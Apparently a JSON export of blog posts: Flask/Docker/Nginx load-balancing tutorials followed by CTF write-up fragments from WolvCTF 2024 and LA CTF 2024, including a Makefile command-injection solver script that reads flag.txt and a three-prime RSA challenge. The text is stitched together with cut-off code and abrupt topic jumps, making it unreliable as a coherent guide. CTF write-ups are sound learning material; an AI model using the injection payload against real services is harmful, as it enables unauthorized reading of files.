[{"content":"Introduction Flask is a small and lightweight Python web framework that provides useful tools and features for creating web applications. It\u0026rsquo;s known for its simplicity and flexibility, making it a popular choice among developers.\nCreating a web application with Flask can be quick and straightforward. We can build a web application using only a single Python file. This makes Flask a more accessible framework for new developers.\nFlask doesn\u0026rsquo;t force a particular directory structure or require complicated boilerplate code before getting started. This means we have the freedom to structure project in a way that best suits needs.\nOne of the key features of Flask is its extensibility. We can add more functionality to Flask application using extensions. This allows to customize application to fit specific requirements.\nFlask uses the Jinja template engine to dynamically build HTML pages using familiar Python concepts such as variables, loops, lists, and so on. This means it can create dynamic web pages without having to write a lot of JavaScript.\nBefore start building a Flask application, we\u0026rsquo;ll need a local Python 3 programming environment. We\u0026rsquo;ll also need an understanding of Python 3 concepts, such as data types, conditional statements, for loops, functions, and other such concepts.\nOnce we\u0026rsquo;ve set up environment, we can install Flask using the pip package installer. After that, we\u0026rsquo;re ready to start building Flask application.\nTopology HTTP Requests: Client requests coming into the Nginx server. nginx:7151: The Nginx web server listening on port 7151. app1, app2, app3: These sections are represent the Apps that Nginx can forward requests to (it will automatically give each app a unique port, after building the container). The topology of the project consists of client requests coming into the Nginx server, which is listening on port 7151. The Nginx server can forward these requests to multiple Flask applications (app1, app2, app3), each running in its own Docker container. This setup allows for load balancing and efficient distribution of client requests, ensuring that the system can handle a large number of simultaneous connections.\nConfigurations Project Structure tree\rflask-docker-nginx-lb ├── app │ ├── Dockerfile │ ├── requirements.txt │ ├── templates │ │ └── index.html │ └── wsgi.py ├── docker-compose.yml ├── nginx.conf 2 directories, 6 files\rRequirements requirements.txt\rflask gunicorn\rDOCKER Dockerfile\rFROM python:3.9-slim WORKDIR /app COPY . .

These containers encapsulate all the dependencies required to run an application, including the code, runtime, system tools, libraries, and settings. Docker containers are isolated from each other and from the host system, ensuring consistent behavior across different environments. Docker simplifies the process of deploying applications, as developers can create containers locally and then deploy them to any environment that supports Docker, whether it\u0026rsquo;s a developer\u0026rsquo;s laptop, a testing server, or a production environment.\nNginx is a high-performance, open-source web server and reverse proxy server. It\u0026rsquo;s known for its efficiency in handling concurrent connections and serving static content quickly. Nginx is often used as a front-end proxy server to route HTTP requests to backend applications or to serve static files directly to clients. It\u0026rsquo;s highly configurable and can be used for various purposes, including load balancing, caching, SSL termination, and serving as a reverse proxy for microservices.\nWhen used together, Docker and Nginx can be a powerful combination for deploying web applications. Here\u0026rsquo;s how they might be used together:\nContainerization: Developers package their web applications and services into Docker containers. These containers include the application code, runtime, dependencies, and any necessary configuration.\nDocker Compose: Docker Compose is a tool for defining and running multi-container Docker applications. Developers can use Docker Compose to define the services that make up their application stack, including the web server (Nginx) and any backend services. Docker Compose simplifies the process of managing and orchestrating multiple Docker containers.\nNginx as a Reverse Proxy: In many deployment scenarios, Nginx is used as a reverse proxy server to route incoming HTTP requests to the appropriate backend services running in Docker containers. Nginx can also handle tasks like load balancing, SSL termination, and caching.\nScaling and Load Balancing: Docker Swarm or Kubernetes can be used to orchestrate multiple Docker containers across a cluster of servers. Nginx can be configured as a load balancer to distribute incoming traffic across the various instances of the application, ensuring high availability and scalability.\nStatic Content Serving: Nginx excels at serving static content efficiently. In a Dockerized environment, Nginx can be used to serve static files directly to clients, offloading this task from the application servers and improving performance.\nDocker and Nginx complement each other well, providing developers with powerful tools for building, deploying, and managing modern web applications.\nTopology HTTP Requests: Represents client requests coming into the Nginx server. Nginx:9999: Represents the Nginx web server listening on port 9999. App1, App2, App3: These sections represent the backend servers that Nginx can forward requests to.

Inside the http block, there\u0026rsquo;s an upstream block named backends, which defines a group of backend servers (server-1, server-2, server-3).\nserver-1 is assigned a weight of 2, indicating that it should receive twice as much traffic as the other servers. server-3 is designated as a backup server, meaning it only handles requests if the primary servers (server-1 and server-2) are unavailable. Inside the server block, there\u0026rsquo;s a location block specifying that all requests should be proxied to the backends group defined earlier.\nDOCKER docker-compose.yml\rversion: \u0026#39;3\u0026#39; services: server-1: image: ealen/echo-server:latest restart: always environment: - ENABLE__ENVIRONMENT=false server-2: image: ealen/echo-server:latest restart: always environment: - ENABLE__ENVIRONMENT=false server-3: image: ealen/echo-server:latest restart: always environment: - ENABLE__ENVIRONMENT=false nginx: image: nginx volumes: - \u0026#34;./nginx.conf:/etc/nginx/nginx.conf\u0026#34; ports: - 9999:9999\rThis docker compose file defines the Docker services for setup.

Since the seed for rand() is determined by the flag, we can predict the sequence of random numbers. However, that the seed is calculated by multiplying all the ASCII values of the characters in the flag, which makes it difficult to reverse.\nHere\u0026rsquo;s the high-level approach to solve this:\nBrute force the seed: Since the seed is a product of ASCII values, and ASCII printable characters range from 32 to 126, the maximum value for the seed is 126^63. However, this is not feasible to brute force. But, considering that the flag format is TBTL{.*}, we can reduce the search space. The seed is also an uint (32-bit), so the maximum value is 2^32-1. This is feasible to brute force. Predict the random sequence: Once the seed are correct, we can generate the same sequence of random numbers as the program. Recover the flag: Now that the same rand() sequence, we can manage to recover the flag. For each character in the flag, calculate target[i] ^ (rand() % 0x100) to get the original character.

This is because the \u0026lt; operator is used for input redirection, and it needs a command to provide input to.\nUnfortunately, we\u0026rsquo;re limited by the fact that we can\u0026rsquo;t use slashes, and most commands are located in directories that require a slash to access (like /bin or /usr/bin).\nHowever, we can take advantage of the fact that Makefiles allow for multiple lines in the command section if they are separated by semicolons. We can use this feature to first assign the content of the flag file to a variable, and then echo that variable:\nname = \u0026#34;readflag\u0026#34;\rcode = \u0026#34;read -r FLAG \u0026lt; flag.txt; echo $$FLAG\u0026#34;\rFinal solver automation:\nsolver.py\r1import requests 2import re 3 4data = { 5 \u0026#39;name\u0026#39;: \u0026#39;readflag\u0026#39;, 6 \u0026#39;code\u0026#39;: \u0026#39;read -r FLAG \u0026lt; flag.txt; echo $$FLAG\u0026#39; 7} 8 9response = requests.post(\u0026#39;https://madefunctional-okntin33tq-ul.a.run.app/make\u0026#39;, data=data) 10flag = re.findall(r\u0026#39;wctf{.*}\u0026#39;, response.text) 11 12print(flag)\rFLAG\rwctf{m4k1ng_f1l3s}\n","date":"2024-03-16","id":18,"permalink":"/posts/ctfs/2024/wolv-ctf-2024/","summary":"https://ctftime.org/event/2240\nCHALL\u0026rsquo;S SOLVED Category Challenge Beginner Crypto: yORs Truly \u0026lt;3 Beginner Crypto: TwoTimePad Beginner Forensics: Hidden Data Beginner Pwn: babypwn Beginner Pwn: babypwn2 Beginner Rev: babyre Crypto Limited 1 Forensics Eternally Pwned: Infiltration Forensics Eternally Pwned: Persistence Misc Made Sense Misc Made Functional Beginner Crypto: yORs Truly \u0026lt;3 Overview\rAuthor: shlswnt Description: I have encrypted some text but it seems I have lost the key!","tags":[],"title":"Wolv CTF 2024"},{"content":"This is the second time I have participated in the LA CTF 2024 event\nhttps://ctftime.org/event/2102\nCHALL\u0026rsquo;S SOLVED Category Challenge CRYPTOGRAPHY very-hot REVERSE ENGINEERING shattered-memories REVERSE ENGINEERING aplet321 very-hot Description\rAuthor: Red Guy I didn\u0026rsquo;t think that using two primes for my RSA was sexy enough, so I used three.\nsrc.py out.txt\nProvided chall source src.py src.py\r1from Crypto.Util.number import getPrime, isPrime, bytes_to_long 2from flag import FLAG 3 4FLAG = bytes_to_long(FLAG.encode()) 5 6p = getPrime(384) 7while(not isPrime(p + 6) or not isPrime(p + 12)): 8 p = getPrime(384) 9q = p + 6 10r = p + 12 11 12n = p * q * r 13e = 2**16 + 1 14ct = pow(FLAG, e, n) 15 16print(f\u0026#39;n: {n}\u0026#39;) 17print(f\u0026#39;e: {e}\u0026#39;) 18print(f\u0026#39;ct: {ct}\u0026#39;)\rAnd out.txt out.txt\rn: 10565111742779621369865244442986012561396692673454910362609046015925986143478477636135123823568238799221073736640238782018226118947815621060733362956285282617024125831451239252829020159808921127494956720795643829784184023834660903398677823590748068165468077222708643934113813031996923649853965683973247210221430589980477793099978524923475037870799 e: 65537 ct: 9953835612864168958493881125012168733523409382351354854632430461608351532481509658102591265243759698363517384998445400450605072899351246319609602750009384658165461577933077010367041079697256427873608015844538854795998933587082438951814536702595878846142644494615211280580559681850168231137824062612646010487818329823551577905707110039178482377985\rThe provided Python script is implementing a basic RSA encryption scheme with a twist.
